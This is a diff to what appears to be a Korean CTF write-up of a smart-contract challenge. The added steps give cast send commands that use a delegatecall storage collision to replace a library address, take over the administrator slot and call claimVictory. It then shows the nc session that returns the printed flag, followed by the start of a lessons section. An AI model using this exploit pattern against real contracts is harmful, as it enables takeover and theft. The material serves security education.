@@ -428,18 +428,81 @@ cast send \\
 - onlyRole(Role.OPERATOR) → default 0으로 누구나 통과.  
 - systemSafety → 초기값 true라 통과.  
 - delegatecall로 ConfigurationLibrary.updateConfig(ATTACK) 실행  
-- → ICS.slot0 (= configurationLibrary) = ATTACK 주소로 변경.
-트랜잭션 결과에서 status 1 (success) 확인.
+- → ICS.slot0 (= configurationLibrary) = ATTACK 주소로 변경.  
+- 트랜잭션 결과에서 status 1 (success) 확인.  
 
 ---
 
 ### 4-6. 2단계 - administrator 탈취
 
+이제 configurationLibrary가 AttackConfig가 되었으므로,  
+다시 updateSystemConfig 를 호출하면 이번에 AttackConfig.updateConfig가 실행된다:
 
+```python
+cast send \\
+  --rpc-url $RPC \\
+  --rpc-headers "X-UUID:$UUID" \\
+  --private-key $PK \\
+  $ICS \\
+  "updateSystemConfig(uint256)" 0
+```
 
+이 때:  
+- AttacConfig.updateConfig(uint256) 동작:
+  - sstore(2, origin())
+- ICS.storage[2] - tx.origin = 공격자의 EOA 주소.
+-> ICS.administrator 주소.
 
+---
 
+### 4-7. 3단계 - claimVictory() 호출
 
+이제 우리는 ICS의 administrator 이므로:
 
+```python
+cast send \\
+  --rpc-url $RPC \\
+  --rpc-headers "X-UUID:$UUID" \\
+  --private-key $PK \\
+  $ICS \\
+  "claimVictory()"
+```
 
+- require(msg.sender == administrator) 통과.
+- solved = true.
+
+---
+
+### 4-8. 플래그 획득
+
+다시 nc:
+
+```python
+nc 10.100.0.11 30000
+
+1 - launch new instance
+2 - kill instance
+3 - get flag (if isSolved() is true)
+action? 3
+uuid please: 4bf39146-52b8-4123-94cd-cdefb83e1ff8
+```
+
+방금 공격한 인스턴스의 UUID를 넣으면,  
+서버는 내부적으로 Setup.isSolved()를 호출해 true임을 확인하고 플래그를 응답한다.  
+
+최종 플래그:
+
+```python
+ACS{476c3cdce086c3c2d2dce086c3c2dce0807f1fa4da476c3c2dce}
+```
+
+---
+
+## 5. 배운 점 및 방어 방법
+
+### 5-1. 배운 점
+
+#### 1. delegatecall + 라이브러리 주소 변경 
+- delegatecall은 코드만 가져오고 storage는 caller의 것을 쓴다.  
+- 라이브러리 주소를 외부 입력으로 바꾸게 두면, 결국 임의 코드 실행과 같다.  
 
